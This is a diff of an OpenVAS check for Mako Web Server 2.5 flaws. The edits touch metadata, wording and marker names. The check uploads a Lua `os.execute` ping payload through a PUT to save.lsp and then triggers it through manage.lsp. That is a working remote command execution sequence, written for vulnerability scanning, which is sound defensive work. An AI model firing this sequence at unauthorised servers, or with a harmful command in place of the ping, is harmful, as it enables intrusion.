@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mako_web_server_mult_vuln.nasl 12043 2018-10-23 14:16:52Z mmartin $
 #
 # Mako Web Server Multiple Vulnerabilities
 #
@@ -29,10 +28,10 @@ CPE = "cpe:/a:mako:mako_web_server";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811771");
-  script_version("$Revision: 12043 $");
+  script_version("2019-07-24T08:39:52+0000");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-23 16:16:52 +0200 (Tue, 23 Oct 2018) $");
+  script_tag(name:"last_modification", value:"2019-07-24 08:39:52 +0000 (Wed, 24 Jul 2019)");
   script_tag(name:"creation_date", value:"2017-09-18 16:33:01 +0530 (Mon, 18 Sep 2017)");
   script_name("Mako Web Server Multiple Vulnerabilities");
   script_category(ACT_ATTACK);
@@ -72,7 +71,10 @@ if(description)
 
   script_tag(name:"affected", value:"Mako Web Server version 2.5. Other versions
   may also be affected.");
-  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one
+  year since the disclosure of this vulnerability. Likely none will be provided anymore. General
+  solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
   script_tag(name:"solution_type", value:"WillNotFix");
 
   script_tag(name:"qod_type", value:"exploit");
@@ -95,7 +97,8 @@ if(host_runs("Windows") == "yes"){
   CMD = "os.execute('ping -n 5 " + this_host() + "')";
   win = TRUE;
 }else{
-  check = "__OpenVAS__" + rand_str(length:4);
+  vtstrings = get_vt_strings();
+  check = vtstrings["ping_string"];
   pattern = hexstr(check);
   CMD = "os.execute('ping -c 5 -p " + pattern + " " + this_host() + "')" ;
 }
@@ -105,20 +108,20 @@ if(!len){
   exit(0);
 }
 
-url = "/examples/save.lsp?ex=openVASTest";
+url = "/examples/save.lsp?ex=VTTest";
 req = string("PUT ", url, " HTTP/1.1\r\n",
           "Content-Length: ", len, "\r\n",
           "Host: ", host, "\r\n",
           "\r\n", CMD);
 res = http_keepalive_send_recv(port:makoPort, data:req);
-if(res =~ "204 No Content" && "Server: MakoServer.net" >< res){
+if(res =~ "^HTTP/1\.[01] 204" && "Server: MakoServer.net" >< res){
 
   soc = open_sock_tcp(makoPort);
   if(!soc){
     exit(0);
   }
 
-  url = "/examples/manage.lsp?execute=true&ex=openVASTest&type=lua";
+  url = "/examples/manage.lsp?execute=true&ex=VTTest&type=lua";
 
   req = string("GET ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n\r\n");
